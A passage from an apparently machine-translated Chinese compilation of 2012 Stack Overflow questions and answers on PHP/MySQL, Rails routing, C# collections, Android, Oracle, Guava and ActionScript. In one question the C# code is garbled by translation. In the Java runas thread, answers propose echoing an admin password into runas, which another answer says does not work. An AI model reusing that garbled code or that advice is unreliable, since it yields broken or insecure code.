              `city_key` int(11) NOT NULL,
              `city_name` varchar(500) NOT NULL,
              `city_code` int(11) NOT NULL,
              `city_country_key` int(11) NOT NULL,
            PRIMARY KEY(`city_key`)
          ) ENGINE=MyISAM DEFAULT CHARSET=utf8";
    mysql_query($sql2) or die(mysql_error()); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T06:45:31.973

您可以创建一个存储过程来创建所有表：

```
DELIMITER $$

CREATE PROCEDURE `localhost`.`sp_CreateTables` ()
BEGIN
  CREATE TABLE IF NOT EXISTS `db_countries` (
     `countrykey` int(11) NOT NULL,
     `countrynamelat` varchar(500) NOT NULL default '',
      PRIMARY KEY  (`countrykey`)
  ) ENGINE=MyISAM  DEFAULT CHARSET=utf8;

  CREATE TABLE IF NOT EXISTS `db_city`(
    `city_key` int(11) NOT NULL,
     `city_name` varchar(500) NOT NULL,
     `city_code` int(11) NOT NULL,
     `city_country_key` int(11) NOT NULL,
     PRIMARY KEY(`city_key`)
  ) ENGINE=MyISAM DEFAULT CHARSET=utf8;
END 
```

然后只需从 PHP 调用存储过程：

```
$sql = "call sp_CreateTables()";
mysql_query($sql) or die(mysql_error()); 
```

# ruby-on-rails-3 - 深度嵌套的多态资源值得付出努力吗？

> ID：10811160
> 
> 赞同：1
> 
> 时间：2012-05-30T06:40:13.573
> 
> 标签：ruby-on-rails-3, polymorphic-associations, custom-routes, nested-routes

在我的开发过程中，我认为深度（> 1）嵌套资源不值得付出努力。

我有这样的事情：

```
 resources :first-level do
    resources :comments
    resources :second-level do
      resources :comments      
      resources :first-child do
        resources :comments
      end
      resources :second-child do
        resources :comments
      end
      resources :third-child do
        resources :comments
      end
    end
  end 
```

更重要的是评论对于其他资源是多态的。我的意图是拥有看起来干净的 URL，例如 ~/first-level/34/comments、~/first-level/34/second-level/56/third-level/comments 等。

到目前为止的问题是嵌套时的多态路由只会导致悲伤。我以几个 Ryan Bates Railscast 为例。例如，如果我尝试在第一级使用 polymorphic_path 它工作正常，我得到：

```
polymorphic_path([@commentable, comments]) => ~/first-level/34/comments 
```

但相同的代码`~/first-level/34/second-level/23`失败：

`undefined method 'second-level_comment_path' for #<#<Class:0x007fcc4acfbe58>:0x007fcc4ae73d08>`但是当我查看我的路线时，实际命名的路线是`first-level_second-level_comment`. 我试图手动创建它`second-level_comment_path`，基本上是别名，`first-level_second-level_comment`但我似乎也无法让它工作。

除非有人可以在这里指出一个明显的错误，否则我倾向于这种方法（http://weblog.jamisbuck.org/2007/2/5/nesting-resources）并且只是取消嵌套这些。我有一个面包屑样式的导航来显示层次结构，这样就足够了，而且我越看它，网址就会变得有点笨拙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T07:04:18.160

对于嵌套资源，当您想要访问子级别时，您需要指定所有父级别。否则 Rails 将不知道如何达到您的孩子级别。因此，您需要使用 first-level_second-level_comment 并提供如下所示的第一级和第二级值：

```
first-level_second-level_comments_path(@my_first_level, @my_second_level) 
```

将呈现：

```
~/first-level/34/second-level/23/comments 
```

编辑：

我不明白为什么您需要逐步构建路径。

您始终可以构建 first_level 评论路径：

```
first-level_comments_path(@my_first_level) 
```

将呈现

```
~/first-level/34/comments 
```

或列出第一级内的所有第二级：（给定第一级的第二级索引操作）

```
first-level_second-levels_path(@my_first_level) 
```

将呈现

```
~/first-level/34/second-levels 
```

# c# - 通过指定属性的唯一性从 IList<> 获取对象

> ID：10811162
> 
> 赞同：1
> 
> 时间：2012-05-30T06:40:19.783
> 
> 标签：c#, .net

这里会详细解释：我有

```
public class Season
    {
        #region Public Variables

        private int _id;
        private string _seasonName;
        private int _startMonth;

        #endregion

        #region Public Properties 

        public int Id
        {
            get { return _id; }
            set { _id = value; }
        }

        public int StartMonth
        {
            get { return _startMonth; }
            set { _startMonth = value; }
        }

        public string SeasonName
        {
            get { return _seasonName; }
            set { _seasonName = value; }
        }

        #endregion

        #region Public Constructor

        public Season()
        {
            this._initialize();
        }

        public Season(string pSeasonName, int _pStartMonth,int pID)
        {
            this._initialize(pSeasonName, _pStartMonth, pID);
        }

        #endregion

    } 
```

接下来我有如下所示

```
IList<Season> seaosns = new List<Season>();
seaosns.Add(new Season("Summer", 4, 1));
seaosns.Add(new Season("Winter", 6, 2));
seaosns.Add(new Season("MidSummer", 10, 1)); 
```

在这里我需要检查 Ilist 项目中是否重复 Id。这可以通过使用 For 循环来完成，但需要知道是否有其他解决方案。

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T06:44:36.443

使用[HashSet](http://msdn.microsoft.com/en-us/library/bb359438.aspx)而不是列表！集合是不包含重复元素且其元素没有特定顺序的集合。您可以提供自定义 IEqualityComparer 来确定您的季节的唯一性。

```
var seaosns = new HashSet<Season>(seasonsEqualityComparer);
seaosns.Add(new Season("Summer", 4, 1));
seaosns.Add(new Season("Winter", 6, 2));
seaosns.Add(new Season("MidSummer", 10, 1)); // returns false... 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-30T06:44:39.650

最合适的方法是将项目（替代或附加）存储在 a 中`Dictionary<int,Season>`，使用唯一属性 ( `Id`) 作为字典中的键。然后，您可以进行`O(1)`查找以测试存在性并通过键 ( `Id`) 获取。但是请注意，字典***没有排序***- 意思是，它不保证尊重插入顺序或键顺序。订单*未定义*- 因此，如果您以特定顺序需要它们，您可能需要单独持有。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-30T06:46:41.820

您可以使用 an`IDictionary`而不是`IList`，然后不允许重复键。您可以`Season.Id`用作密钥。使用 a[`Lookup`](http://msdn.microsoft.com/de-de/library/bb460184.aspx)将允许您复制元素，因此您可以迭代键并检查与其关联的元素数量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T06:51:59.683

如果你只是想**检查**，试试这个：

```
var hasDuplicates = list.GroupBy(season => season.Id).Any(groupping => groupping.Count() > 1); 
```

但是，如果您想获取集合，即最初没有重复项，请使用 HashSet 或 Dictionary，正如其他人所说，或者从不允许添加重复项的 Collection 中创建子类。

# jquery - 任何 jquery 或 html5 插件/脚本都可以播放本地视频文件吗？

> ID：10811166
> 
> 赞同：2
> 
> 时间：2012-05-30T06:40:34.100
> 
> 标签：jquery, video, html5-video, local

我想创建一个演示页面，在我的硬盘上播放本地视频文件。

演示页面的 url 也将基于 file:///。

视频文件几乎都是avi。

我已经尝试过 jquery 媒体插件和 jplayer，并且在本地播放任何视频都没有运气。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T06:53:25.453

如果您提供视频的相对路径，您应该能够播放本地视频，即将视频放在 HTML 文件所在的同一位置（或子目录）并将播放器指向该文件。所以不要`file:///path/to/movie.avi`使用`media/movie.avi`（其中`media`是 HTML 文件所在目录的子目录）。

请注意，某些浏览器在运行本地 HTML/JavaScript 时会采取额外的安全措施，因此尤其是在 IE 中，您可能需要先调整安全设置。

# android - Android 应用程序无法打开

> ID：10811167
> 
> 赞同：0
> 
> 时间：2012-05-30T06:40:42.027
> 
> 标签：android, installation, apk

我刚刚在 Intellij 中创建了一个 Android 应用程序。它在模拟器上运行良好，与我在手机上的 Android 版本（2.3.3）相同但是，当我在手机上安装 apk 文件时，它安装得很好，但是你无法打开应用程序.

我的意思是安装完成，你有一个完成选项，但打开是灰色的。菜单中没有项目，也没有创建快捷方式。我在清单中有这个：

```
<uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>

<application android:label="@string/app_name" android:icon="@drawable/icon" android:enabled="true">
    <activity android:name="PhlogMain"
              android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>
    <activity android:name=".PhlogEditNotes"/>
    <service android:name=".PhlogListenerService"/>
</application> 
```

我有三星 Galaxy Ace S5830 手机。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-05T10:07:55.203

因此，经过大量工作，我重建了整个东西，更换了钥匙并再次尝试，它成功了。我不确定它从哪里开始工作，但至少现在是这样！:-)

# coding-style - 您是否使用代表可调用对象的类名的名词？

> ID：10811169
> 
> 赞同：7
> 
> 时间：2012-05-30T06:41:06.050
> 
> 标签：coding-style, functor, callable

这里有一个更通用的[问题](https://stackoverflow.com/questions/158639/do-you-always-use-nouns-for-class-names)。将此视为对此的扩展。

我知道类代表对象的类型，我们应该使用名词作为它们的名称。但是许多语言支持的[函数对象](http://en.wikipedia.org/wiki/Function_object)更像函数而不是对象。我应该将这些类也命名为名词，还是在这种情况下可以使用动词。`doSomething()`，从语义上讲，比 更有意义`Something()`。

**更新/结论**

我得到的两个投票最多的答案意见不一：

> *阿提拉*
> 
> 然而，在函子的情况下，它们代表“动作”，因此用动词（或某种名词-动词组合）命名它们更合适——就像根据函数的作用命名函数一样。
> 
> *车*
> 
> 另一方面，仿函数的实例实际上是一个函数，因此可能会更好地命名。按照上面吉姆的建议，`SomethingDoer doSomething; doSomething();`

他们两个，在经历了一些代码之后，似乎是常见的做法。在 stl 的 GNU 实现中，我发现了`negate`, `plus`, `minus`(bits/stl_function.h) 等类以及`variate_generator`, `mersenne_twister`(tr1/random.h)。同样，在 boost 中，我发现了`base_visitor`, `predecessor_recorder`(graph/visitors.hpp) 和`inverse`, `inplace_erase`(icl/functors.hpp) 之类的类

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-06T23:21:14.633

对象（因此类）通常代表“事物”，因此您想用名词命名它们。然而，在函子的情况下，它们代表“动作”，因此用动词（或某种名词-动词组合）命名它们更合适——就像根据函数的作用命名函数一样。

通常，您会希望根据它们的用途来命名事物（对象、函数等），即它们在程序/世界中所代表的内容。

您可以将函子视为具有状态的函数（因此是“动作”）。由于实现这一点（具有与您的“动作”相关联的状态）的简洁方法是创建一个存储状态的对象，因此您得到一个对象，它实际上是一个“动作”（一个花哨的功能）。

请注意，上述内容适用于可以创建纯函子的语言，即调用与常规函数相同的对象（例如 C++）。在不支持这一点的语言中（即，您必须有一个方法，而不是`operator()`被调用的方法，例如`command.do()`），您可能希望将类似命令的类/对象命名为名词，并将该方法命名为动词。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T11:56:19.663

函子的类型是一个类，你也可以用你通常的风格来命名它（例如，一个名词），因为它自己并没有真正做任何事情。另一方面，仿函数的实例实际上是一个函数，因此可能会更好地命名。按照上面吉姆的建议，`SomethingDoer doSomething; doSomething();`

快速浏览一下我自己的代码表明我已经设法通过使用既是名词又是动词的词来完全避免这个问题......`Filter`例如`Show`。然而，在所有情况下应用该命名方案可能会很棘手！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T13:11:26.450

我建议你给它们一个后缀，比如`Function`, `Callback`, `Action`,`Command`等，这样你就可以拥有名为`SortFunction`,的类`SearchAction`，`ExecuteCommand`而不是`Sort`, `Search`，`Execute`这听起来更像是实际函数的名称。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T15:59:08.380

我认为有两种方法可以看到这一点：

1) 可以合理命名的*类*，以便在构造时直接将其作为仿函数调用：

`Doer()(); // constructed and invoked in one shot, compiler could optimize`

2)我们希望在无状态仿函数对象上多次调用仿函数的情况下的*实例，或者可能出于风格原因，当 #1 的语法不优选时。*

```
Doer _do;
_do(); // operator () invocation after construction 
```

我喜欢上面@Rook 的建议，即用具有相同动词和名词形式的单词命名类，例如`Search`or `Filter`。

# android - 如何更改 ANDROID_NDK_ROOT 和 COCOS2DX_ROOT？

> ID：10811173
> 
> 赞同：1
> 
> 时间：2012-05-30T06:41:33.490
> 
> 标签：android, cocos2d-android

大家好， 在安装和配置 cocos2d 和 android ndk 时，我遇到了一些问题，我估计的问题是 android_ndk 和 cocos2d 的默认路径正在使用 cygdrive/e/android/android-ndk-r8/ndk。（如参考我正在使用这个链接[http://www.multigesture.net/articles/how-to-setup-cocos2d-x-windows-and-android/](http://www.multigesture.net/articles/how-to-setup-cocos2d-x-windows-and-android/)）

让我提供命令提示符图像： ![在此处输入图像描述](../Images/66541357e59113381462979046599b80.png)

谢谢。

# android - Android：使用 VpnService 监控网络流量

> ID：10811174
> 
> 赞同：3
> 
> 时间：2012-05-30T06:41:36.320
> 
> 标签：android, vpn, packet-sniffers, network-monitoring

> **可能重复：**
> [可能使用 VpnService 实现来捕获和发送数据包？](https://stackoverflow.com/questions/9199553/possible-to-use-vpnservice-implementation-to-capture-and-send-packets)

我必须使用 VpnService 监控网络流量。我浏览了 [http://developer.android.com/resources/samples/ToyVpn/index.html](http://developer.android.com/resources/samples/ToyVpn/index.html)和[http://www.taosoftware.co.jp/en/android/packetcapture/](http://www.taosoftware.co.jp/en/android/packetcapture/)提供的 VpnService 示例， 但不能了解我如何捕获网络流量。请提出一种在 android 中捕获数据包的方法或发布对任何此类资源的引用。

谢谢

# php - 异步连接到 MySQL 服务器

> ID：10811175
> 
> 赞同：0
> 
> 时间：2012-05-30T06:41:36.953
> 
> 标签：php, mysql, asynchronous

我正在编写一个自定义 PHP MySQL 库，它将连接到多个 MySQL 服务器，并提供应用程序级别的负载平衡。基本上它会尝试连接到一组服务器（全部），第一个成功连接的服务器获胜。

问题是，在我的一生中，我看不到使用PHP 库`mysql`或`mysqli`PHP 库的方式来说异步连接，即使用回调。显然我不想阻止每次连接尝试，否则库将不得不等待超时，然后尝试下一个服务器。

它应该像这样工作：

```
foreach($servers as $server) {
    mysql_async_connect($server, function($connection) {
        if($connection) {
            //Use this connection, successful
        }
    }
} 
```

这怎么可能？有没有人写过一个异步 PHP 库来连接 MySQL？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T06:53:57.873

你试图做的不会工作 - PHP 只是伪多线程。

这意味着如果多个用户访问同一个脚本，如果它在多线程机器上运行，则两个请求将并行执行。但是您不能指定从单个脚本调用开始的单独线程。

您可以做的是使用使用回调的 javascript 创建一个 AJAX 应用程序，在服务器端使用 php 来获取您的数据。

# actionscript-3 - Actionscript 3 中的多线程

> ID：10811183
> 
> 赞同：0
> 
> 时间：2012-05-30T06:42:57.383
> 
> 标签：actionscript-3, flash, flash-cs5

有什么方法可以在 Actionscript3 中进行多线程处理。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T21:08:46.233

随着 Flash Player 11.4 和 AIR 3.4 的发布，有一个带有[Worker](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Worker.html)类的新并发 API。

[这里](http://www.gotoandlearn.com/play.php?id=162)有关于 Workers 的视频教程。

您可能还对[AS3-Workers-Compat](https://github.com/jcward/AS3-Worker-Compat)库感兴趣，该库包含有关如何以与旧版 Flash Player 兼容的方式使用 Workers 的示例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-31T10:21:21.570

截至今天，不，截至今年晚些时候，可能，是的：

[http://www.adobe.com/devnet/flashplatform/whitepapers/roadmap.html](http://www.adobe.com/devnet/flashplatform/whitepapers/roadmap.html)

Flash Player“Dolores” Adob​​e 计划在 2012 年下半年发布一个额外的 Flash Player。代号为“Dolores”，这个版本的重点是为游戏市场启用特性和功能，以及对一般 Flash Player 用例的改进.

此版本计划的一些功能包括：

*   ActionScript 工作者（允许在单独的线程上同时执行 ActionScript）
*   支持高级分析
*   支持更多硬件加速视频卡（从 2005/2006 年开始），以扩展硬件加速内容的可用性
*   改进了面向 Apple iOS 时的 ActionScript 性能
*   性能指标 API，用于通知当前环境的性能能力
*   释放外部鼠标事件 API
*   用于访问快速内存操作码的 ActionScript 3 API（与 Stage3D API 结合使用时的高级功能）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T06:51:57.360

不，ActionScript 3 中没有多线程。

您需要编写自己的代码来充其量[“假”线程](http://www.over00.com/?p=1240)。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-08-01T20:43:39.800

现在已经不是这种情况了，不妨更新这篇文章。请参阅 Worker 类 ( [http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Worker.html](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Worker.html) )

这是我在网上找到的教程：http: [//esdot.ca/site/2012/intro-to-as3-workers-hello-world](http://esdot.ca/site/2012/intro-to-as3-workers-hello-world)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-01T22:00:12.877

它不是，现在我们有了 Actionscript Workers，它与 actionscript 3 并发。换句话说，多线程......它现在仅适用于 AIR/Mobile。[http://www.yeahbutisitflash.com/?p=4368](http://www.yeahbutisitflash.com/?p=4368)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-30T09:30:59.343

简单的答案是否定的，但是如果您可以将问题转换为纹理域并在其上运行着色器（像素弯曲器）并将结果处理回您的问题域......那么您可以在显卡上实现并行执行，但 AS3 仅通过在每个成功的方法执行后给予最高优先级的方法执行时间来模拟多线程。

# oracle - 在 ODP.NET（用户定义类型）中使用 Oracle UDT 时出现奇怪问题

> ID：10811185
> 
> 赞同：3
> 
> 时间：2012-05-30T06:43:07.767
> 
> 标签：oracle, odp.net, user-defined-types

甲骨文 11g。

我在使用 UDT 时遇到了一个奇怪的问题，我有这 4 个模式：USER_1、USER_2、USER_A、USER_B。USER_1 和 USER_2 都有一个 UDT（实际上是一个嵌套表）：

```
CREATE OR REPLACE TYPE TAB_NUMBERS AS TABLE OF NUMBER(10) 
```

USER_A 有一个同义词指向 USER_1 中的类型：

```
create or replace synonym TAB_NUMBERS for USER_1.TAB_NUMBERS; 
```

USER_B 有一个同义词指向 USER_2 中的类型：

```
create or replace synonym TAB_NUMBERS for USER_2.TAB_NUMBERS; 
```

USER_A 和 USER_B 都有一个使用同义词的过程：

```
CREATE OR REPLACE PROCEDURE proc_test (p1 in tab_numbers)
IS
BEGIN
  NULL;
END; 
```

在 C# 代码中：

```
OracleConnection conn = new OracleConnection("data source=mh;user id=USER_A;password=...");
OracleCommand cmd = new OracleCommand();
cmd.Connection = conn;
cmd.CommandText = "proc_test";
cmd.CommandType = CommandType.StoredProcedure;
//
OracleParameter op = new OracleParameter();
op.ParameterName = "p1";
op.Direction = ParameterDirection.Input;
op.OracleDbType = OracleDbType.Object;
op.UdtTypeName = "TAB_NUMBERS";
Nested_Tab_Mapping_To_Object nt = new Nested_Tab_Mapping_To_Object();
nt.container = new decimal[] { 1, 2 };
op.Value = nt;
...... 
```

此代码工作正常，但是当我将连接字符串从 USER_A 更改为 USER_B 时会引发错误，错误显示：

```
OCI-22303: type ""."TAB_NUMBERS" not found 
```

有趣的是，如果我改变 op.UdtTypeName = "TAB_NUMBERS"; 到 op.UdtTypeName = "USER_2.TAB_NUMBERS"，错误消失了，一切正常。

有人有任何线索吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-09-08T15:26:11.277

无论是通过 OracleCustomTypeMappingAttribute 对象还是 XML 配置文件提供映射，都不能使用同义词指定自定义类型映射。

[https://docs.oracle.com/cd/E11882_01/win.112/e23174/featUDTs.htm#ODPNT382](https://docs.oracle.com/cd/E11882_01/win.112/e23174/featUDTs.htm#ODPNT382)

# android - 如何在特定位置的 ListView 中添加 Header 并为列表项创建自定义视图

> ID：10811192
> 
> 赞同：3
> 
> 时间：2012-05-30T06:43:38.617
> 
> 标签：android, listview

我又来了一个问题，我想用 imageview 和 textview 创建一个列表项的自定义视图，而且我还需要在特定位置添加标题。我从未使用过分段列表视图。`textview and imageview`我需要在 listitem中添加多个，还需要`header's`在一些随机位置添加。请帮我解决这个问题。我用谷歌搜索了它，我也找到了一些例子，但我做不到`customize`。

提前致谢。马哈维尔。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:15:45.990

我有点明白了。您应该`header`在模型中添加更多属性。

如果您的`header`= **true**并且在您的`adapter`班级中，那么您必须夸大布局`header.xml`。否则，如果`header`= **false** ，那么您应该像往常一样膨胀您的 xml 文件，即 ( `TextView`, )。`ImageView`

在我`separator`的代码中与您的相同`header`

```
@Override
    public View getView(final int position, View convertView, ViewGroup parent) {
            // TODO Auto-generated method stub

            final recordModel model = records.get(position);
            ViewHolder holder;
             convertView = null;
            holder = new ViewHolder();
            if(records.get(position).getSeparator()==0){
                    convertView = inflater.inflate(R.layout.record_row, null);
                    convertView.setTag(holder);
                    holder.imageView = (ImageView) convertView
                                    .findViewById(R.id.iconCallType);
                    holder.title = (TextView) convertView.findViewById(R.id.title);
                    holder.note = (TextView) convertView.findViewById(R.id.note);
                    holder.checkBox = (CheckBox) convertView.findViewById(R.id.check_box);
                   ..........................
            }else if(records.get(position).getSeparator()==1){
                    convertView = inflater.inflate(R.layout.separator, null);
                    convertView.setTag(holder);
                    holder.title = (TextView) convertView.findViewById(R.id.textSeparator);
                    holder.title.setText(records.get(position).getCallDay());
            }

            return convertView;
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T06:48:47.657

我们确实有很多很棒的教程，请查看以下示例：-

1.  [安卓版块列表](http://code.google.com/p/android-section-list/)

2.  [Android 惊人的 ListView](http://code.google.com/p/android-amazing-listview/)

如果您在执行此操作时必须处理 anu 问题或必须满足任何特定要求来完成它，请告诉我们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T06:47:00.280

**[您可以使用getItemViewType()](http://developer.android.com/reference/android/widget/Adapter.html#getItemViewType%28int%29)**和[**getViewTypeCount()**](http://developer.android.com/reference/android/widget/Adapter.html#getViewTypeCount%28%29)在任何特定位置添加自己的 Header 。[**这**](http://android.amberfog.com/?p=296)是一个很好的博客，解释了有关使用这些方法的所有内容。

# java - 有没有一种简单的方法可以在 Guava 中循环 stdin？

> ID：10811194
> 
> 赞同：4
> 
> 时间：2012-05-30T06:43:46.100
> 
> 标签：java, guava

在 Apache Commons 中，我可以写：

```
LineIterator it = IOUtils.lineIterator(System.in, "utf-8");
while (it.hasNext()) {
    String line = it.nextLine();
    // do something with line
} 
```

番石榴有类似的东西吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-30T06:51:30.793

好吧，首先......这不是你特别需要一个库的东西，因为它可以使用直接的 JDK 作为

```
BufferedReader reader = new BufferedReader(new InputStreamReader(System.in,
  Charsets.UTF_8));
// okay, I guess Charsets.UTF_8 is Guava, but that lets us not worry about
// catching UnsupportedEncodingException
while (reader.ready()) {
  String line = reader.readLine();
} 
```

但是如果你想要更多的收藏品-y Guava 提供[`List<String> CharStreams.readLines(Readable)`](https://google.github.io/guava/releases/snapshot-jre/api/docs/com/google/common/io/CharStreams.html#readLines-java.lang.Readable-).

我认为我们不提供 an 是`Iterator`因为实际上没有任何好的方法来处理`IOException`s 的存在。Apache`LineIterator`似乎默默地捕获`IOException`并关闭了迭代器，但是……这似乎是一种令人困惑、有风险且并不总是正确的方法。基本上，我认为这里的“Guava 方法”要么`List<String>`一次将整个输入读入 a ，要么自己执行`BufferedReader`-style 循环并决定如何*处理*s 的潜在存在`IOException`。

一般来说，Guava 的大多数 I/O 实用程序都专注于可以关闭和重新打开的流，例如文件和资源，但不是真正的`System.in`.

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-30T07:35:51.630

```
Scanner sc = new Scanner(System.in,"UTF-8");
while(sc.hasNext()) {
  String next = sc.nextLine();
} 
```

你不需要番石榴

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-05-13T08:52:18.143

由于 Java 8`BufferedReader`具有返回行流的新方法[`lines()`](https://docs.oracle.com/javase/8/docs/api/java/io/BufferedReader.html#lines--)，因此您可以轻松使用：

```
BufferedReader reader = new BufferedReader(
    new InputStreamReader(System.in, StandardCharsets.UTF_8));
reader.lines()
    .forEach(line -> { // or any other stream operation
      // process liness
    }) 
```

# forms - 使用 UTL 在表中插入数据

> ID：10811196
> 
> 赞同：0
> 
> 时间：2012-05-30T06:43:51.483
> 
> 标签：forms, oracle, plsql, oracle10g, oracle11g

朋友们，我编写了一个代码来使用我在下面给出的 UTL 代码在 newemp 表中上传数据，但我得到了错误

```
 1  declare
  2       EMPNO     NUMBER(4);
  3       ENAME      VARCHAR2(10);
  4       JOB       VARCHAR2(10);
  5       MGR       NUMBER(4);
  6       HIREDATE  DATE;
  7       SAL       NUMBER(7,2);
  8       COMM      NUMBER(7,2);
  9       DEPTNO    NUMBER(2);
 10       line varchar2(100);
 11       namesfile UTL_FILE.FILE_TYPE;
 12      begin
 13       namesfile :=UTL_FILE.FOPEN('DIPRJDIR','empdata.txt','R');
 14       loop
 15       UTL_FILE.GET_LINE(namesfile,EMPNO,4);
 16       dbms_output.put_line('EMPNO :' || EMPNO);
 17       UTL_FILE.GET_LINE(namesfile,ENAME,10);
 18       dbms_output.put_line('ENAME :' || ENAME);
 19       UTL_FILE.GET_LINE(namesfile,JOB,9);
 20       dbms_output.put_line('JOB :' || JOB);
 21       UTL_FILE.GET_LINE(namesfile,MGR,4);
 22       dbms_output.put_line('MGR :' || MGR);
 23       UTL_FILE.GET_LINE(namesfile,HIREDATE,5);
 24       dbms_output.put_line('HIREDATE :' || HIREDATE);
 25       UTL_FILE.GET_LINE(namesfile,SAL,9);
 26       dbms_output.put_line('SAL :' || SAL);
 27       UTL_FILE.GET_LINE(namesfile,COMM,9);
 28       dbms_output.put_line('COMM :' || COMM);
 29       UTL_FILE.GET_LINE(namesfile,DEPTNO,2);
 30       dbms_output.put_line('DEPTNO :' || DEPTNO);
 31       insert into newemp values(EMPNO,ENAME,JOB,MGR,HIREDATE,SAL,COMM,DEPTNO);
 32       end loop;
 33       utl_file.fclose(namesfile);
 34*      end;
SQL> /
EMPNO :7839
ENAME :KING
JOB :PRESIDENT
MGR :0

ERROR

declare
*
ERROR at line 1:
ORA-01843: not a valid month
ORA-06512: at line 23 
```

我的数据在下面给定格式 7839KING PRESIDENT 000017-nov-1981 005000.00 000000.0010 所以请帮助我

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:35:49.567

这是因为[UTL_FILE.GET_LINE](http://docs.oracle.com/cd/B19306_01/appdev.102/b14258/u_file.htm#i1003796)过程将 VARCHAR2 作为第二个参数。

如果您放置 varchar2 以外的其他内容，oracle 会尝试将其隐式转换为正确的类型。
这对您使用数字非常有效，但是对于 Date 数据类型，oracle 将使用`NLS_DATE_FORMAT`可能不符合文件中字符串格式的 。

您可以通过在调用中使用 VARCHAR2 来修复它，`UTL_FILE.GET_LINE`然后使用`to_date`函数将其转换为日期数据类型。

But, there is a better way to do this job-
You can use an [external table](http://docs.oracle.com/cd/B19306_01/server.102/b14215/et_concepts.htm) to read the file and then `insert-select` from it.

# c# - 在 C# 中导航时从 ListBox SelectedIndex 获取图像源

> ID：10811199
> 
> 赞同：1
> 
> 时间：2012-05-30T06:44:20.667
> 
> 标签：c#, windows-phone-7

我有一个 ListBox 与来自 SampleData 源的图像绑定。在选择 ListBox 项时，我想在下一页显示图像，所以我在导航时通过了 SelectedIndex，但我无法获取图像或显示它。我的代码如下：`

//相册图片.cs

公共类 AlbumImages: ObservableCollection {

```
} 
```

//相册图片.cs

公共类 AlbumImage { 公共字符串标题 { 获取；放; }

```
 public string content { get; set; }  
} 
```

//App.xaml.cs

```
 private static MainViewModel viewModel = null;

    public AlbumImages albumImages = new AlbumImages();

    public int selectedImageIndex; 
```

//MainPage.xaml.cs

```
 private void listBoxPhoto_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (listBoxPhoto.SelectedIndex == -1) return;

        this.NavigationService.Navigate(new Uri("/Photogallery.xaml?SelectedIndex=" + listBoxPhoto.SelectedIndex, UriKind.Relative));
    } 
```

//相册.xaml.cs

```
 // Reference to App

    private App app = App.Current as App;

protected override void OnNavigatedTo(System.Windows.Navigation.NavigationEventArgs e)
    {

    base.OnNavigatedTo(e);

        IDictionary<string, string> parameters = this.NavigationContext.QueryString;

        if (parameters.ContainsKey("SelectedIndex"))
        {
            app.selectedImageIndex = Int32.Parse(parameters["SelectedIndex"]);

        }
        else
        {
            app.selectedImageIndex = 0;
        }
    LoadImage();
}
     private void LoadImage()
    {
    BitmapImage bitmapImage = new BitmapImage();
    bitmapImage.UriSource=new Uri(app.albumImages[app.selectedImageIndex].content, UriKind.RelativeOrAbsolute);
    image.Source = bitmapImage;
}` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T09:46:32.580

要满足您的要求，您还必须使 photoCollection 对 Photogallery 页面全局可用。您可以通过从 MainPage.xaml.cs 页面将 photoCollection（您用于绑定到列表框）的副本分配给 App.xaml.cs 的 albumImages 来执行此操作

注意：您的代码在问题中进行了一些更改（我不确定是谁做的），但代码非常接近工作。

# java - 从java执行时如何为runas命令提供密码

> ID：10811209
> 
> 赞同：14
> 
> 时间：2012-05-30T06:44:49.250
> 
> 标签：java, batch-file

我必须从需要管理权限的 java 程序运行批处理文件。我正在使用以下命令

```
runtime.getruntime().exec("runas /user:Admin \"C:\\Program Files\\test.bat\""); 
```

但是当它被执行时，它会提示输入管理员帐户的密码。我怎样才能给它的密码。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-16T10:21:07.773

您不能将密码通过管道传输到 runas，因为它从终端请求密码，而不是从标准输入。没有“sudo -s”的等价物。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T06:50:57.453

试试这个

```
runtime.getruntime().exec("cmd /C echo YOUR_PASS | runas /user:Admin \"C:\Program Files\test.bat\""); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-30T06:52:08.763

我小时候做过这个

```
echo Pa$$W0Rd | some_command_expects_it 
```

# xaml - 如何在 Windows 8 Metro 应用程序中使用 xaml 在按钮内容中添加特殊符号？

> ID：10811210
> 
> 赞同：1
> 
> 时间：2012-05-30T06:44:52.140
> 
> 标签：xaml, windows-8, microsoft-metro

